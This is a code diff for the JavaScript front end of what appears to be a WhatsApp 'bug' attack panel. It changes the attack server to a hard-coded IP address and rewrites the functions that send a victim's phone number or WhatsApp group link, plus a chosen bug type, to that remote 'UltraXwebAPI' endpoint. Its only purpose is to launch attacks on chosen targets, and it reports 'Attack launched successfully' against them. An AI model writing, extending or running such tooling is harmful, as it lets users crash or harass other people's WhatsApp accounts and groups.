@@ -7,7 +7,8 @@ const headers = {
 };
 
 // Attack API configuration
-const ATTACK_API_URL = "https://cella-why.mydigital-store.me/permen";
+const STATUS_API_URL = "http://178.128.24.51:2001/status";
+const ATTACK_API_URL = "http://178.128.24.51:2001/UltraXwebAPI";
 
 // Global variables
 let currentUser = null;
@@ -70,6 +71,13 @@ function generateDeviceId() {
   return Math.random().toString(36).substring(2, 15);
 }
 
+// Toggle Target Field
+function toggleTargetField() {
+  const targetType = document.getElementById('targetType').value;
+  document.getElementById('phoneNumberGroup').classList.toggle('hidden', targetType !== 'phone');
+  document.getElementById('whatsappGroup').classList.toggle('hidden', targetType !== 'whatsapp');
+} 
+
 // Toggle password visibility
 function togglePassword(inputId) {
   const input = document.getElementById(inputId);
@@ -113,17 +121,29 @@ function showMenu(menuId) {
 // Check API connection status
 async function checkApiConnection() {
   try {
-    const response = await fetch(ATTACK_API_URL);
+    const response = await fetch(STATUS_API_URL);
     const statusElement = document.getElementById('apiStatus');
+    
     if (statusElement) {
-      statusElement.className = response.ok ? 'status-connected' : 'status-disconnected';
-      statusElement.innerHTML = response.ok ? 
-        '<i class="fas fa-check-circle"></i> Connected' : 
-        '<i class="fas fa-times-circle"></i> Disconnected';
+      if (response.ok) {
+        const data = await response.json();
+        statusElement.className = 'status-connected';
+        statusElement.innerHTML = `<i class="fas fa-check-circle"></i> Connected (${data.status || 'Operational'})`;
+        return true;
+      } else {
+        statusElement.className = 'status-disconnected';
+        statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Disconnected';
+        return false;
+      }
     }
     return response.ok;
   } catch (error) {
     console.error('API connection check failed:', error);
+    const statusElement = document.getElementById('apiStatus');
+    if (statusElement) {
+      statusElement.className = 'status-disconnected';
+      statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Connection Failed';
+    }
     return false;
   }
 }
@@ -381,61 +401,48 @@ async function resetPassword() {
 // Launch attack
 async function launchAttack() {
   const targetNumber = document.getElementById('targetNumber').value.trim();
-  const whatsappGroup = document.getElementById('whatsappGroup').value.trim();
   const bugType = document.getElementById('bugType').value;
   const attackBtn = document.getElementById('attackBtn');
   const attackResult = document.getElementById('attackResult');
 
-  // Clear previous messages
-  attackResult.innerHTML = '';
-  attackResult.style.color = '';
-
-  // Validate inputs
-  if (!targetNumber && !whatsappGroup) {
-    showError(attackResult, 'Please enter either target number or WhatsApp group link');
+  if (!targetNumber) {
+    attackResult.innerHTML = 'Please enter target number';
+    attackResult.style.color = '#f44336';
     return;
   }
 
-  if (targetNumber && whatsappGroup) {
-    showError(attackResult, 'Please use either target number OR WhatsApp group, not both');
-    return;
-  }
-
-  // Set loading state
-  setButtonLoading(attackBtn, true);
+  attackBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Attacking...';
+  attackBtn.disabled = true;
 
   try {
     const isConnected = await checkApiConnection();
     if (!isConnected) {
-      showError(attackResult, 'API is currently unavailable');
+      attackResult.innerHTML = 'API is currently unavailable';
+      attackResult.style.color = '#f44336';
       return;
     }
 
-    let apiUrl = `${ATTACK_API_URL}?type=${bugType}`;
-    if (targetNumber) {
-      apiUrl += `&chatId=${encodeURIComponent(targetNumber)}`;
-    } else {
-      apiUrl += `&groupLink=${encodeURIComponent(whatsappGroup)}`;
-    }
-
-    const response = await fetch(apiUrl);
+    const response = await fetch(`${ATTACK_API_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}`);
     
     if (!response.ok) {
-      throw new Error("Failed to connect to server");
+      throw new Error("Failed to connect to attack server");
     }
 
     const result = await response.json();
     
     if (result.success) {
-      const target = targetNumber || whatsappGroup;
-      showSuccess(attackResult, `Attack launched successfully against ${target}`);
+      attackResult.innerHTML = `Attack launched successfully against ${targetNumber}`;
+      attackResult.style.color = 'var(--main)';
     } else {
-      showError(attackResult, result.message || 'Attack failed');
+      attackResult.innerHTML = result.message || 'Attack failed';
+      attackResult.style.color = '#f44336';
     }
   } catch (error) {
-    showError(attackResult, 'Attack failed: ' + error.message);
+    attackResult.innerHTML = 'Attack failed: ' + error.message;
+    attackResult.style.color = '#f44336';
   } finally {
-    setButtonLoading(attackBtn, false);
+    attackBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
+    attackBtn.disabled = false;
   }
 }
 
@@ -520,43 +527,6 @@ async function deleteUser(username) {
   } catch (error) {
     console.error('Error deleting user:', error);
     alert('Failed to delete user');
-  }
-}
-
-// Load user list for admin
-// Send bug to WhatsApp group
-async function sendGroupBug() {
-  const whatsappGroup = document.getElementById('whatsappGroup').value.trim();
-  const bugType = document.getElementById('bugType').value;
-  const attackResult = document.getElementById('attackResult');
-
-  if (!whatsappGroup) {
-    showError(attackResult, 'Please enter WhatsApp group link');
-    return;
-  }
-
-  try {
-    const isConnected = await checkApiConnection();
-    if (!isConnected) {
-      showError(attackResult, 'API is currently unavailable');
-      return;
-    }
-
-    const response = await fetch(`${ATTACK_API_URL}?groupLink=${encodeURIComponent(whatsappGroup)}&type=${bugType}`);
-    
-    if (!response.ok) {
-      throw new Error("Failed to connect to server");
-    }
-
-    const result = await response.json();
-    
-    if (result.success) {
-      showSuccess(attackResult, `Bug sent successfully to WhatsApp group`);
-    } else {
-      showError(attackResult, result.message || 'Failed to send bug');
-    }
-  } catch (error) {
-    showError(attackResult, 'Failed to send bug: ' + error.message);
   }
 }
 
@@ -734,3 +704,65 @@ async function loadUserList() {
     userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #f44336;">Error loading users</td></tr>';
   }
 }
+
+// Switch between attack tabs
+function switchAttackTab(tabName) {
+  // Update tab buttons
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.classList.toggle('active', btn.textContent.toLowerCase().includes(tabName));
+  });
+  
+  // Update content sections
+  document.getElementById('numberTarget').classList.toggle('hidden', tabName !== 'number');
+  document.getElementById('whatsappTarget').classList.toggle('hidden', tabName !== 'whatsapp');
+  
+  // Clear previous results
+  document.getElementById('attackResult').innerHTML = '';
+}
+
+// Enhanced sendGroupBug function
+async function sendGroupBug() {
+  const groupLink = document.getElementById('whatsappGroup').value.trim();
+  const bugType = document.getElementById('whatsappBugType').value;
+  const attackBtn = document.getElementById('whatsappAttackBtn');
+  const resultElement = document.getElementById('attackResult');
+
+  if (!groupLink) {
+    showError(resultElement, 'Please enter WhatsApp group link');
+    return;
+  }
+
+  attackBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+  attackBtn.disabled = true;
+
+  try {
+    const isConnected = await checkApiConnection();
+    if (!isConnected) {
+      showError(resultElement, 'API is currently unavailable');
+      return;
+    }
+
+    const response = await fetch(`${ATTACK_API_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}`);
+    
+    if (!response.ok) {
+      throw new Error(await response.text() || "Failed to connect to server");
+    }
+
+    const result = await response.json();
+    if (result.success) {
+      showSuccess(resultElement, `Bug successfully sent to WhatsApp group!`);
+    } else {
+      showError(resultElement, result.message || 'Failed to send bug');
+    }
+  } catch (error) {
+    showError(resultElement, `Error: ${error.message}`);
+  } finally {
+    attackBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Group Bug';
+    attackBtn.disabled = false;
+  }
+}
+
+// Initialize attack menu when shown
+document.getElementById('attackMenu').addEventListener('show', async () => {
+  await checkApiConnection();
+});
